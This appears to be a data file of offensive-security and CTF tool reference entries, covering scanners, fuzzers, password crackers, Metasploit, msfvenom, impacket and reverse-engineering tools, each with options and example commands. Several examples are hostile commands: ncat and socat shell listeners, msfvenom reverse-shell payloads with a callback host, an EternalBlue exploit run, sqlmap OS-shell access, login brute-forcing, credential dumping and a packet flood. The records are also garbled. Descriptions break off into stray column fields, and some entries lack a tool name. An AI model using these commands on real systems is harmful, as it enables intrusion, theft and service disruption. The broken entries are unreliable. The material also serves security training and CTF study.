description: Nmap is a powerful network scanner for discovering hosts and services. Supports TCP SYN/Connect/ACK scans
usage: version detection
column7: and NSE scripts.
column8:
nmap [Scan Type(s)] [Options] {target specification}
Options:
  -sS: TCP SYN scan (stealth)
  -sT: TCP Connect scan
  -sV: Version detection
  -sC: Default scripts
  -O: OS detection
  -Pn: Skip host discovery
  -p: Port specification
  -A: Aggressive scan
  --script: Run NSE scripts
column9:
nmap -sV 192.168.1.1
nmap -sS -p 1-1000 target.com
nmap -A -T4 192.168.1.0/24
nmap --script vuln target.com

description: Masscan is the fastest port scanner - can scan the entire internet in under 6 minutes. Uses asynchronous transmission.
usage:
masscan [options] <targets>
Options:
  -p: Port specification
  --rate: Packets per second
  -oL: Output list format
  --banners: Grab banners
  --adapter-ip: Source IP

description: Netcat (nc) is a versatile networking utility for reading and writing data across network connections. Useful for port scanning
usage: file transfers
column7:
nc [options] <host> <port>
Options:
  -l: Listen mode
  -v: Verbose
  -p: Local port
  -e: Execute command
  -u: UDP mode
  -z: Zero-I/O mode (scanning)
column8:
nc -lvp 4444
nc target.com 80
nc -z -v target.com 1-1000
echo 'GET /' | nc target.com 80

description: Netcat alias. Same as netcat command.
usage:
nc [options] <host> <port>
Options:
  -l: Listen mode
  -v: Verbose
  -p: Local port

description: Ncat is Nmap's reimplementation of netcat with SSL support
usage: connection brokering
column7:
ncat [options] <host> <port>
Options:
  --ssl: Use SSL
  --proxy: Use proxy
  -e: Execute command
  --allow: Allow connections from hosts
column8:
ncat --ssl target.com 443
ncat -lvp 4444 -e /bin/bash
ncat --proxy proxy:8080 target.com 80

description: Command-line tool for transferring data using various protocols. Essential for web exploitation and API testing.
usage:
curl [options] <URL>
Options:
  -X: Request method
  -d: POST data
  -H: Header
  -b: Cookie
  -o: Output file
  -v: Verbose
  -k: Insecure (skip SSL verify)
examples:
curl http://target.com
curl -X POST -d "user=admin&pass=test" http://target.com/login
curl -H "Authorization: Bearer token" http://target.com/api

description: Downloads files from HTTP
usage: HTTPS
examples: and FTP servers. Supports recursive downloads.
column7:
wget [options] <URL>
Options:
  -O: Output filename
  -r: Recursive download
  -q: Quiet
  --no-check-certificate: Skip SSL verify
column8:
wget http://target.com/file.zip
wget -O output.txt http://target.com/data
wget -r http://target.com/directory/

description: Captures and displays network traffic. Essential for network forensics and debugging.
usage:
tcpdump [options]
Options:
  -i: Interface
  -r: Read from file
  -w: Write to file
  -n: Don't resolve names
  -A: ASCII output
  -X: Hex and ASCII
examples:
tcpdump -i eth0
tcpdump -r capture.pcap
tcpdump -i eth0 -w output.pcap
tcpdump -r capture.pcap -A | grep -i password

description: Terminal-based Wireshark. Captures and analyzes network traffic with powerful filtering.
usage:
tshark [options]
Options:
  -i: Interface
  -r: Read file
  -Y: Display filter
  -T: Output format
  -e: Field to print
examples:
tshark -r capture.pcap
tshark -r capture.pcap -Y "http"
tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e http.file_data

description: OWASP Amass performs network mapping by collecting information from various sources including APIs
usage: DNS
column7:
amass enum [options] -d <domain>
Options:
  -d: Target domain
  -passive: Passive mode only
  -o: Output file
  -brute: Brute force
column8:
amass enum -d target.com
amass enum -passive -d target.com
amass enum -brute -d target.com -o subs.txt

description: Subfinder discovers subdomains using passive online sources. Fast and efficient with multiple source support.
usage:
subfinder [options] -d <domain>
Options:
  -d: Domain
  -dL: Domain list file
  -o: Output file
  -silent: Silent mode
  -all: Use all sources
examples:
subfinder -d target.com
subfinder -d target.com -o subs.txt
subfinder -dL domains.txt -o all_subs.txt

description: Httpx probes for web servers and extracts info like status codes
usage: titles
column7:
httpx [options]
Options:
  -l: Input list
  -u: Target URL
  -status-code: Show status
  -title: Show title
  -tech-detect: Detect tech
  -content-length: Show length
column8:
cat urls.txt | httpx
httpx -l urls.txt -status-code -title
cat subs.txt | httpx -tech-detect

description: TheHarvester gathers emails
usage: names
column7: IPs and URLs from public sources like search engines and PGP servers.
column8:
theHarvester [options] -d <domain>
Options:
  -d: Domain
  -b: Data source (google, bing, etc.)
  -l: Limit results
column9:
theHarvester -d target.com -b google
theHarvester -d target.com -b all -l 500

description: SQLmap automates detection and exploitation of SQL injection vulnerabilities. Can enumerate databases
usage: extract data
column7:
sqlmap [options] -u <URL>
Options:
  -u: Target URL with parameter
  --dbs: Enumerate databases
  -D: Database to enumerate
  --tables: Enumerate tables
  -T: Table to enumerate
  --dump: Dump table data
  --os-shell: Get OS shell
  --batch: Non-interactive mode
column8:
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D mydb --tables
sqlmap -u "http://target.com/page?id=1" --os-shell

description: Nikto scans web servers for dangerous files
usage: outdated software
examples: and other problems. Checks over 6700 potentially dangerous files.
column7:
nikto -h <host> [options]
Options:
  -h: Target host
  -p: Port
  -ssl: Force SSL
  -o: Output file
  -Display: Show types (1=redirects, 2=cookies, etc.)
column8:
nikto -h http://target.com
nikto -h https://target.com -ssl
nikto -h target.com -p 8080 -o scan.txt

description: Gobuster brute-forces URIs (directories/files)
usage: DNS subdomains
examples: and virtual host names. Fast and flexible.
column7:
gobuster <mode> [options]
Modes: dir, dns, vhost, fuzz
Options:
  -u: Target URL
  -w: Wordlist
  -x: File extensions
  -t: Threads
column8:
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w wordlist.txt -x php,txt,html
gobuster dns -d target.com -w subdomains.txt

description: DIRB scans web servers for existing and hidden web objects using dictionary-based attacks.
usage:
dirb <url> [wordlist] [options]
Options:
  -o: Output file
  -r: Don't search recursively
  -a: User-agent
  -p: Proxy
examples:
dirb http://target.com
dirb http://target.com /usr/share/wordlists/dirb/big.txt
dirb http://target.com -o results.txt

description: WFuzz is a flexible web fuzzer for finding hidden resources
usage: parameters
examples: and vulnerabilities. Uses FUZZ keyword as placeholder.
column7:
wfuzz [options] -z payload,params <url>
Options:
  -w: Wordlist
  -c: Colorize output
  --hc: Hide responses with code
  --hw: Hide by word count
  -d: POST data
  -H: Header
column8:
wfuzz -c -w wordlist.txt http://target.com/FUZZ
wfuzz -c -w wordlist.txt --hc 404 http://target.com/FUZZ
wfuzz -c -w wordlist.txt -d "user=FUZZ&pass=test" http://target.com/login

description: Nuclei scans for vulnerabilities using YAML templates. Fast and highly customizable with community templates.
usage:
nuclei [options] -u <url>
Options:
  -u: Target URL
  -l: URL list
  -t: Template path
  -severity: Filter severity
  -tags: Filter by tags
examples:
nuclei -u http://target.com
nuclei -l urls.txt -t cves/
nuclei -u target.com -severity critical,high

brief: Fast web fuzzer written in Go
description: Ffuf is a fast web fuzzer. Uses FUZZ keyword as placeholder. Supports multiple wordlists and matchers.
usage:
ffuf [options] -u <url> -w <wordlist>
Options:
  -u: URL with FUZZ
  -w: Wordlist
  -fc: Filter status codes
  -mc: Match codes
  -H: Headers
  -X: HTTP method
examples:
ffuf -u http://target.com/FUZZ -w wordlist.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301

description: Feroxbuster recursively discovers content using brute force combined with wordlists. Written in Rust for speed.
usage:
feroxbuster [options] -u <url>
Options:
  -u: Target URL
  -w: Wordlist
  -x: Extensions
  -t: Threads
  --burp: Proxy through Burp
examples:
feroxbuster -u http://target.com
feroxbuster -u http://target.com -w wordlist.txt -x php,txt

description: Katana is a fast crawler that discovers endpoints
usage: files
column7:
katana [options] -u <url>
Options:
  -u: Target URL
  -d: Crawl depth
  -jc: JavaScript crawling
  -jsl: JSLuice parsing
column8:
katana -u http://target.com
katana -u http://target.com -d 5 -jc

description: Dirsearch brute forces directories and files in web servers with threading and recursion support.
usage:
dirsearch [options] -u <url>
Options:
  -u: Target URL
  -e: Extensions
  -w: Wordlist
  -r: Recursive
  -t: Threads

description: WhatWeb identifies websites and recognizes CMS
usage: frameworks
column7: and technologies in use.
column8:
whatweb [options] <url>
Options:
  -v: Verbose
  -a: Aggression level (1-4)
  --log-json: JSON output
  -i: Input file
column9:
whatweb http://target.com
whatweb -v http://target.com
whatweb -a 3 http://target.com

description: WPScan scans WordPress sites for vulnerabilities in core
usage: plugins
examples: and themes. Enumerates users and checks passwords.
column7:
wpscan [options] --url <url>
Options:
  --url: Target URL
  --enumerate: Enumerate (u=users, p=plugins, t=themes)
  --api-token: API token
  --passwords: Password list
column8:
wpscan --url http://target.com
wpscan --url http://target.com --enumerate u,p
wpscan --url http://target.com --enumerate vp

description: Commix automates detection and exploitation of command injection vulnerabilities in web applications.
usage:
commix [options] -u <url>
Options:
  -u: Target URL
  --data: POST data
  --os-cmd: Execute command
  -v: Verbosity level

description: John the Ripper is a fast password cracker supporting many hash types. Supports dictionary
usage: brute force
column7:
john [options] <password_file>
Options:
  --wordlist: Dictionary file
  --format: Hash format
  --show: Show cracked passwords
  --rules: Enable word mangling
  --incremental: Brute force mode
column8:
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=raw-md5 --wordlist=words.txt hashes.txt
john --show hashes.txt

description: Hashcat is the world's fastest password recovery tool. Supports 300+ hash types and multiple attack modes with GPU acceleration.
usage:
hashcat [options] <hash_file> [wordlist]
Options:
  -m: Hash type (0=MD5, 1000=NTLM, etc.)
  -a: Attack mode (0=dict, 1=combo, 3=brute)
  -o: Output file
  --show: Show cracked
  -r: Rules file
examples:
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 -a 0 ntlm.txt wordlist.txt
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a

description: Hydra is a parallelized login cracker supporting numerous protocols including SSH
usage: FTP
column7: SMB
column8: RDP
column10:
hydra [options] <target> <service>
Options:
  -l: Single username
  -L: Username list
  -p: Single password
  -P: Password list
  -t: Threads
  -V: Verbose
  -s: Port
column11:
hydra -l admin -P passwords.txt target.com ssh
hydra -L users.txt -P passwords.txt target.com ftp
hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

description: Medusa is a speedy
usage: parallel
examples: and modular login brute-forcer supporting many services including SSH
column7: FTP
column8: HTTP
column11:
medusa [options] -h <host> -M <module>
Options:
  -h: Target host
  -H: Host file
  -u: Username
  -U: Username file
  -p: Password
  -P: Password file
  -M: Module (ssh, ftp, http, etc.)
  -t: Threads
column12:
medusa -h target.com -u admin -P passwords.txt -M ssh
medusa -h target.com -U users.txt -P passwords.txt -M ftp

description: Crunch generates wordlists based on criteria you specify including character sets
usage: min/max length
column7:
crunch <min> <max> [charset] [options]
Options:
  -o: Output file
  -t: Pattern (@=lower, ,=upper, %=number, ^=symbol)
  -b: Max file size
column8:
crunch 8 8 -o wordlist.txt
crunch 6 6 abc123 -o custom.txt
crunch 8 8 -t @@@@%%%% -o pattern.txt

description: Hashid identifies different types of hashes. Shows corresponding Hashcat mode and John format.
usage:
hashid [options] <hash>
Options:
  -e: Extended (include salted)
  -m: Show hashcat mode
  -j: Show john format

description: Metasploit is a penetration testing framework with exploits
usage: payloads
examples: and auxiliary modules. Industry standard for exploitation.
column7:
msfconsole [options]
Commands:
  search: Find modules
  use: Select module
  set: Set options
  exploit/run: Execute
  sessions: Manage sessions
column8:
msfconsole
msf> search type:exploit platform:windows
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> set RHOSTS target.com
msf> exploit

description: Msfvenom creates payloads for Metasploit and standalone use. Supports encoding and multiple output formats.
usage:
msfvenom [options]
Options:
  -p: Payload
  -f: Format (exe, elf, raw, etc.)
  -o: Output file
  -e: Encoder
  -b: Bad characters
  LHOST/LPORT: Callback address
examples:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe

description: Searchsploit searches the Exploit-DB archive for exploits and shellcode. Offline access to exploit database.
usage:
searchsploit [options] <term>
Options:
  -m: Mirror/copy exploit
  -x: Examine exploit
  -p: Show path
  -w: Show URL
  --cve: Search by CVE
examples:
searchsploit apache 2.4
searchsploit -m 42966
searchsploit wordpress plugin
searchsploit --cve 2021-44228

description: CrackMapExec automates pentesting of Windows/AD networks. Supports SMB
usage: WinRM
column7: RDP
column8: LDAP
column11:
crackmapexec <protocol> <target> [options]
Protocols: smb, winrm, mssql, rdp, ldap, ssh, ftp
Options:
  -u: Username
  -p: Password
  -H: Hash
  -d: Domain
column12:
crackmapexec smb 192.168.1.0/24
crackmapexec smb target.com -u admin -p password
crackmapexec smb target.com -u admin -H <hash>

description: NetExec is the successor to CrackMapExec. Multi-protocol post-exploitation tool for Windows networks.
usage:
netexec <protocol> <target> [options]
Protocols: smb, winrm, mssql, vnc, rdp, ldap, wmi, nfs, ssh, ftp
Options:
  -u: Username
  -p: Password
  -H: Hash
examples:
netexec smb 192.168.1.0/24
netexec smb target.com -u admin -p password

description: Evil-WinRM provides a shell over WinRM with upload/download features and PowerShell capabilities.
usage:
evil-winrm [options] -i <ip>
Options:
  -i: Target IP
  -u: Username
  -p: Password
  -H: NTLM hash
  -s: Scripts path
  -e: Executables path

description: Responder poisons LLMNR
usage: NBT-NS
examples: and MDNS requests to capture credentials on local networks.
column7:
responder [options] -I <interface>
Options:
  -I: Interface
  -A: Analyze mode
  -w: WPAD rogue server
  -r: NetBIOS wredir
  -f: Fingerprint hosts
column8:
responder -I eth0
responder -I eth0 -wrf
responder -I eth0 -A

description: Secretsdump extracts credentials from SAM
usage: LSA
column7: and cached domain credentials.
column8:
secretsdump.py [options] <target>
Options:
  -sam: SAM file
  -system: SYSTEM file
  -ntds: NTDS.dit file
  -just-dc: DC only
  -history: Include history
column9:
impacket-secretsdump domain/user:pass@target
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

description: PsExec executes commands remotely using SMB and named pipes. Provides interactive shell.
usage:
psexec.py [options] <target> [command]
Format: domain/user:pass@target
Options:
  -hashes: NTLM hash
  -c: Copy file
  -path: Command path

description: SMBClient connects to SMB shares for browsing
usage: downloading
column7:
smbclient.py [options] <target>
Format: domain/user:pass@target
Options:
  -hashes: NTLM hash
  -k: Kerberos auth
column8:
impacket-smbclient domain/user:pass@target
impacket-smbclient -hashes :HASH domain/user@target

usage:

Options:
  -d: Domain
  -u: Username
  -p: Password
  -c: Collection method (All, DCOnly, etc.)

examples:

description: SMBMap enumerates SMB shares and permissions. Can download/upload files and execute commands.

Options:

  -u: Username
  -p: Password
  -d: Domain

examples:

usage:

Options:

  -N: No password

enum4linux [options] <target>
Options:
  -a: All enumeration
  -U: Get users
  -S: Get shares
  -P: Get password policy
  -G: Get groups
column8:

enum4linux -U 192.168.1.100

description: Binwalk analyzes
usage: reverse engineers
examples: and extracts firmware images. Identifies embedded files and executable code.

binwalk [options] <file>
Options:
  -e: Extract files
  -M: Matryoshka (recursive)
  -D: Extract specific type

column8:

description: Foremost recovers files based on headers
usage: footers
examples: and internal data structures. Works on disk images and raw data.

foremost [options] -i <input> -o <output_dir>
Options:
  -i: Input file
  -o: Output directory
  -t: File types (jpg, png, pdf, etc.)
  -v: Verbose
column8:
foremost -i disk.img -o recovered/
foremost -t jpg,png,pdf -i disk.img -o recovered/

description: Steghide hides and extracts data in image and audio files. Supports JPEG
usage: BMP
column7: and AU formats.
column8:
steghide <command> [options]
Commands: embed, extract, info
Options:
  -cf: Cover file
  -ef: Embed file
  -sf: Stego file
  -p: Password
column9:

steghide extract -sf image.jpg -p password
steghide embed -cf image.jpg -ef secret.txt

description: ExifTool reads
usage: writes and edits metadata in images
column7: video
column8: and documents.
column9:
exiftool [options] <file>
Options:
  -all: All metadata
  -common: Common tags
  -G: Show group names
  -json: JSON output

description: Identifies file type by examining magic bytes and structure. Essential first step in analysis.
usage:
file [options] <file>
Options:
  -b: Brief mode
  -i: MIME type
  -z: Look inside compressed files
examples:

file -b mystery.bin
file -i document.pdf

description: Creates hex dump of a file or reverses it. Useful for examining and modifying binary data.
usage:
xxd [options] <file>
Options:
  -r: Reverse (hex to binary)
  -p: Plain hexdump
  -l: Length
  -s: Start offset
  -c: Columns
examples:
xxd file.bin
xxd -p file.bin
xxd -l 100 file.bin
echo '48656c6c6f' | xxd -r -p

description: Displays file contents in hexadecimal
usage: ASCII
column7:
hexdump [options] <file>
Options:
  -C: Canonical hex+ASCII
  -n: Number of bytes
  -s: Skip bytes
column8:
hexdump -C file.bin
hexdump -C -n 100 file.bin

description: Extracts printable character sequences from files. Finds hardcoded strings
usage: passwords
column7:
strings [options] <file>
Options:
  -a: Scan entire file
  -n: Minimum string length
  -e: Encoding (s=7-bit, l=16-bit LE)
  -t: Print offset
column8:

strings -n 10 binary
strings binary | grep -i password

description: Displays information about object files. Disassembles executables and shows headers
usage: symbols
column7:
objdump [options] <file>
Options:
  -d: Disassemble executable sections
  -D: Disassemble all sections
  -x: Display all headers
  -t: Symbol table
  -h: Section headers
column8:

description: GDB debugs programs written in C
examples: and other languages. Essential for binary exploitation and reverse engineering.
column7:
gdb [options] <program>
Commands:
  r (run): Run program
  b (break): Set breakpoint
  c (continue): Continue
  si/ni: Step instruction
  x: Examine memory
  disas: Disassemble
column8:
gdb ./program
gdb -q ./program
(gdb) b main
(gdb) r
(gdb) x/20x $rsp

description: Radare2 (r2) is a complete framework for reverse-engineering and analyzing binaries. Includes disassembler
usage: debugger
column7:
r2 [options] <file>
Options:
  -A: Analyze on load
  -d: Debug mode
  -w: Write mode
Commands:
  aaa: Analyze all
  pdf: Print function disassembly
  afl: List functions
  VV: Graph mode
column8:
r2 ./binary
r2 -A ./binary
[0x00000000]> aaa
[0x00000000]> pdf @ main

description: Checksec checks security properties of binaries including RELRO
usage: Stack Canary
column7: and PIE.
column8:
checksec [options] <binary>
Shows:
  RELRO: Read-Only relocations
  Stack: Stack canary
  NX: Non-executable stack

description: Ropper searches binaries for ROP gadgets. Supports multiple architectures and can generate chains.
usage:

Options:
  -f: File to analyze
  --search: Search for gadgets
  -I: Info about binary
  --chain: Generate chain

description: ROPgadget finds gadgets in binaries for exploit development. Uses Capstone disassembler.
usage:
ROPgadget [options] --binary <file>
Options:
  --binary: Target file
  --ropchain: Generate chain
  --only: Filter gadgets

description: Traces library calls made by a program. Useful for understanding program behavior.
usage:
ltrace [options] <program> [args]
Options:
  -e: Filter functions
  -s: String display length
  -o: Output file

description: Traces system calls and signals. Shows how a program interacts with the OS.
usage:
strace [options] <program> [args]
Options:
  -e: Filter syscalls
  -f: Follow forks
  -o: Output file
  -p: Attach to PID

description: Encodes or decodes data using Base64 encoding. Common in CTFs for obfuscating strings.
usage:
base64 [options] [file]
Options:
  -d: Decode
  -w: Wrap at column
examples:
echo 'Hello' | base64
echo 'SGVsbG8=' | base64 -d
base64 file.bin

description: OpenSSL is a toolkit for SSL/TLS and general cryptography. Encrypts
usage: decrypts
column7: and generates keys.
column8:
openssl <command> [options]
Commands:
  enc: Encrypt/decrypt
  dgst: Hash functions
  rsa: RSA operations
column9:
openssl enc -aes-256-cbc -d -in encrypted.bin -out decrypted.txt
openssl dgst -md5 file.txt
openssl dgst -sha256 file.txt

description: Chisel creates fast TCP/UDP tunnels over HTTP for pivoting and port forwarding.
usage:
chisel <mode> [options]
Modes: server, client
Server: chisel server -p <port> --reverse
Client: chisel client <server> <tunnels>
examples:
# Server
chisel server -p 8080 --reverse
# Client reverse port forward
chisel client server:8080 R:8888:127.0.0.1:80

description: Proxychains routes connections through proxies (SOCKS/HTTP) for anonymity and pivoting.
usage:
proxychains4 [options] <command>
Config: /etc/proxychains4.conf
Options:
  -q: Quiet mode
  -f: Config file
examples:
proxychains4 nmap -sT target.com
proxychains4 curl http://target.com

description: Socat creates bidirectional data transfers between addresses. Swiss army knife for networking.
usage:
socat [options] <addr1> <addr2>
Address types:
  TCP-LISTEN, TCP
  UDP-LISTEN, UDP
  EXEC, FILE, STDIO
examples:
socat TCP-LISTEN:8080,fork TCP:target:80
socat TCP-LISTEN:4444 EXEC:/bin/bash
socat FILE:file.txt TCP:target:1234

description: Searches for patterns in files using regular expressions. Essential for finding flags and filtering output.
usage:
grep [options] <pattern> <file>
Options:
  -i: Case insensitive
  -r: Recursive
  -n: Line numbers
  -o: Only matching part
  -E: Extended regex

description: Searches directory tree for files matching criteria. Finds hidden files and specific types.
usage:
find <path> [options]
Options:
  -name: Filename pattern
  -type: File type (f=file, d=dir)
  -size: File size
  -exec: Execute command

description: Powerful text processing language. Great for extracting fields and transforming data.
usage:
awk [options] 'pattern {action}' <file>
Variables:
  $0: Entire line
  $1,$2...: Fields
  NR: Record number
  NF: Number of fields

description: Stream editor for filtering and transforming text. Useful for search and replace.
usage:
sed [options] 's/pattern/replacement/' <file>
Options:
  -i: Edit in place
  -n: Suppress output
  -E: Extended regex
examples:
sed 's/old/new/' file.txt
sed -i 's/old/new/g' file.txt
sed -n '5,10p' file.txt

description: Python programming language. Essential for writing exploits and using security libraries.
usage:
python3 [options] [script.py]
Useful modules:
  pwntools: CTF/exploit framework
  requests: HTTP library
  socket: Network programming
examples:
python3 -c "print('A'*100)"
python3 exploit.py
python3 -c "from pwn import *; p = remote('host',1337)"

description: Python library for rapid exploit development. Provides utilities for binary exploitation and networking.
usage:
from pwn import *
Functions:
  remote(host, port): Connect
  process(binary): Local process
  p32/p64: Pack integers
  u32/u64: Unpack integers
  asm/disasm: Assembly
examples:
from pwn import *
p = remote('target.com', 1337)
p.sendline(b'payload')
p.interactive()

description: Rlwrap adds readline support to commands for better shell interaction with history and editing.
usage:
rlwrap [options] <command>
Options:
  -a: Always readline
  -c: Complete filenames

brief: Extract hash from 7z archives for cracking
description: Extracts password hashes from 7-Zip archives for use with John the Ripper. Part of the john2* family of hash extractors.
usage:
7z2john <archive.7z> > hash.txt
Output: Hash in John-compatible format

description: Sends ARP packets to discover hosts on local network. Can fingerprint devices by MAC address vendor lookup.
usage:
arp-scan [options] <target>
Options:
  -l: Scan local network
  -I: Interface
  --localnet: Scan local subnet
  -r: Retries

description: Sends ARP requests to discover if a host is alive on the local network. Works at Layer 2, bypassing firewalls that block ICMP.
usage:
arping [options] <host>
Options:
  -c: Count of packets
  -I: Interface
  -w: Timeout

description: Extracts password hashes from Bitcoin wallet.dat files for cracking with John the Ripper.
usage: bitcoin2john <wallet.dat> > hash.txt

description: Scans disk images, files, or directories and extracts features like email addresses, credit card numbers, URLs, and other patterns without parsing filesystem.
usage:
bulk_extractor [options] -o <outdir> <image>
Options:
  -o: Output directory
  -E: Enable specific scanner
  -e: Enable scanner (with defaults)
  -x: Disable scanner
examples:
bulk_extractor -o output disk.img
bulk_extractor -E email -o results disk.raw

description: Tests WebDAV enabled servers for file upload vulnerabilities. Attempts to upload various file types to find executable uploads.
usage:
davtest [options] -url <url>
Options:
  -url: Target URL
  -auth: Authentication (user:pass)
  -directory: Test directory
  -uploadfile: Custom file to upload

description: Generates custom dictionaries for directory brute-forcing based on patterns or base words.
usage: dirb-gendict <options>

description: Performs DNS enumeration including zone transfers, reverse lookups, subdomain bruteforcing, and record enumeration.
usage:
dnsrecon [options] -d <domain>
Options:
  -d: Domain
  -t: Type (std, rvl, brt, srv, axfr, etc.)
  -D: Dictionary file
  -a: Perform zone transfer
examples:
dnsrecon -d target.com
dnsrecon -d target.com -t axfr
dnsrecon -d target.com -D subdomains.txt -t brt

description: Locates non-contiguous IP space and hostnames against specified domains by bruteforcing DNS and checking for zone transfers.
usage:
fierce [options] --domain <domain>
Options:
  --domain: Target domain
  --subdomain-file: Wordlist
  --dns-servers: Custom DNS
  --threads: Thread count

description: Sends ICMP echo requests to multiple hosts simultaneously. Much faster than ping for scanning ranges.
usage:
fping [options] <targets>
Options:
  -a: Show alive hosts
  -g: Generate target list from range
  -q: Quiet (summary only)
  -c: Count

description: Software reverse engineering framework developed by NSA. Features disassembler, decompiler, scripting, and collaborative analysis.
usage:
ghidraRun [options]
Or use headless mode:
analyzeHeadless <project_dir> <project_name> -import <file>

description: Distributed version control system. In CTF context, useful for finding exposed .git directories and extracting source code.
usage:
git [command] [options]
Commands:
  clone: Clone repository
  log: View history
  diff: Show changes
  checkout: Switch branches
examples:
git clone http://target.com/.git
git log --oneline
git diff HEAD~5
git checkout HEAD -- .
wget -r http://target.com/.git/

description: Encrypts and signs data using OpenPGP standard. Manages keys and can decrypt encrypted messages or files.
usage:
gpg [options] <file>
Options:
  -d: Decrypt
  -c: Symmetric encrypt
  --import: Import key
  --export: Export key
  --list-keys: Show keys
examples:
gpg -d encrypted.gpg
gpg -c secret.txt
gpg --import pubkey.asc
gpg --decrypt message.asc

description: Extracts password hashes from GPG private keys for cracking with John the Ripper.
usage: gpg2john <private_key> > hash.txt

description: Identifies the type of hash provided. Similar to hashid but uses different identification method.
usage:
hash-identifier
Then paste hash interactively

description: Network tool for crafting and sending custom TCP/IP packets. Useful for firewall testing, port scanning, and network testing.
usage:
hping3 [options] <host>
Options:
  -S: SYN flag
  -p: Destination port
  -c: Packet count
  --flood: Send packets fast
  -a: Spoof source IP
examples:
hping3 -S -p 80 target.com
hping3 -S -p 80 -c 3 target.com
hping3 --flood -S -p 80 target.com

description: Discovers and fingerprints IKE hosts (VPN servers). Tests for aggressive mode vulnerabilities.
usage:
ike-scan [options] <targets>
Options:
  -M: Multiline mode
  -A: Aggressive mode
  --id: Set identification
  -P: Save PSK to file

description: Lightweight JSON processor for parsing, filtering, and transforming JSON data from command line.
usage:
jq [options] <filter> [file]
Filters:
  .: Identity
  .field: Extract field
  .field.subfield: Nested
  .[]: Array elements
  select(): Filter
examples:
cat data.json | jq .
jq '.users[0].name' data.json
jq '.[] | select(.id > 5)' data.json
curl api.example.com | jq '.results'

description: Extracts password hashes from KeePass .kdbx database files for cracking with John the Ripper.
usage: keepass2john <database.kdbx> > hash.txt

description: Extracts password hashes from LUKS encrypted volumes for cracking with John the Ripper.
usage: luks2john <device_or_image> > hash.txt

description: Easy-to-use terminal text editor. Useful for editing scripts and configuration files during CTF challenges.
usage:
nano [options] <file>
Commands (Ctrl+):
  O: Save
  X: Exit
  W: Search
  K: Cut line

description: Scans IP networks for NetBIOS name information. Discovers Windows hosts and their shares.
usage:
nbtscan [options] <target>
Options:
  -r: Use local port 137
  -v: Verbose
  -h: Human readable

description: Fast network authentication cracking tool from Nmap project. Supports many protocols including SSH, RDP, FTP, HTTP.
usage:
ncrack [options] <service://target>
Options:
  -U: Username file
  -P: Password file
  -u: Single username
  -p: Single password
  --user: Username
examples:
ncrack ssh://192.168.1.100 -U users.txt -P passwords.txt
ncrack rdp://target.com -u admin -P passwords.txt
ncrack ftp://192.168.1.100 -U users.txt -P pass.txt

description: Discovers hosts on network using ARP requests. Can run in passive mode to sniff ARP traffic.
usage:
netdiscover [options]
Options:
  -i: Interface
  -r: IP range
  -p: Passive mode
  -c: Count

description: Nmap's packet generation tool. Creates custom packets for network testing and analysis.
usage:
nping [options] <targets>
Options:
  --tcp: TCP mode
  --udp: UDP mode
  --icmp: ICMP mode
  -p: Port
  -c: Count
  --flags: TCP flags
examples:
nping --tcp -p 80 target.com
nping --icmp -c 5 192.168.1.1
nping --tcp --flags SYN -p 22 target.com

description: Extracts password hashes from password-protected Microsoft Office documents for cracking.
usage: office2john <document> > hash.txt

description: Fast SNMP scanner for discovering community strings. Uses multiple threads for speed.
usage:
onesixtyone [options] <target>
Options:
  -c: Community string file
  -i: Target file
  -o: Output file
examples:
onesixtyone 192.168.1.100 public
onesixtyone -c community.txt 192.168.1.100
onesixtyone -c community.txt -i hosts.txt

description: Flexible brute-forcing tool supporting many protocols and services. Modular design allows custom attacks.
usage:
patator <module> <options>
Modules:
  ftp_login, ssh_login, http_fuzz
  mysql_login, pgsql_login
  smtp_login, pop_login
examples:
patator ssh_login host=192.168.1.100 user=admin password=FILE0 0=passwords.txt
patator http_fuzz url=http://target.com/login method=POST body='user=admin&pass=FILE0' 0=passwords.txt

description: Extracts password hashes from encrypted PDF files for cracking with John the Ripper.
usage: pdf2john <file.pdf> > hash.txt

description: Extracts password hashes from PuTTY private key files (.ppk) for cracking.
usage: putty2john <key.ppk> > hash.txt

description: Alias for radare2, the reverse engineering framework. Provides disassembly, debugging, and binary analysis.
usage:
r2 [options] <file>
Options:
  -A: Analyze on load
  -d: Debug mode
  -w: Write mode

description: Part of radare2 suite. Extracts information from binaries: symbols, imports, exports, strings, sections.
usage:
rabin2 [options] <file>
Options:
  -I: Binary info
  -i: Imports
  -E: Exports
  -z: Strings
  -S: Sections

description: Part of radare2 suite. Compares two binaries at different levels: bytes, basic blocks, or functions.
usage:
radiff2 [options] <file1> <file2>
Options:
  -A: Analyze for differences
  -C: Code diffing
  -g: Graph diff
examples:
radiff2 old_binary new_binary
radiff2 -A original patched

description: Extracts password hashes from encrypted RAR archives for cracking with John the Ripper.
usage: rar2john <archive.rar> > hash.txt

description: Terminal multiplexer allowing multiple terminal sessions in one window. Useful for maintaining persistent sessions.
usage:
screen [options]
Options:
  -S: Session name
  -r: Reattach
  -ls: List sessions
Commands (Ctrl+a):
  c: New window
  d: Detach

description: Collection of wordlists for security testing. Includes usernames, passwords, URLs, fuzzing patterns, and more. Located at /usr/share/seclists/
usage:
Path: /usr/share/seclists/
Subdirectories:
  Passwords/: Password lists
  Usernames/: Username lists
  Discovery/: Web/DNS discovery
  Fuzzing/: Fuzzing payloads

description: Active web application security reconnaissance tool from Google. Performs comprehensive crawling and security testing.
usage:
skipfish [options] -o <output_dir> <url>
Options:
  -o: Output directory
  -S/-W: Wordlists
  -I: Only test path
  -X: Exclude path

description: Collection of command-line tools for filesystem forensics. Analyzes disk images and file systems.
usage:
Tools include:
  mmls: Partition layout
  fls: List files/directories
  icat: Extract file by inode
  fsstat: Filesystem info
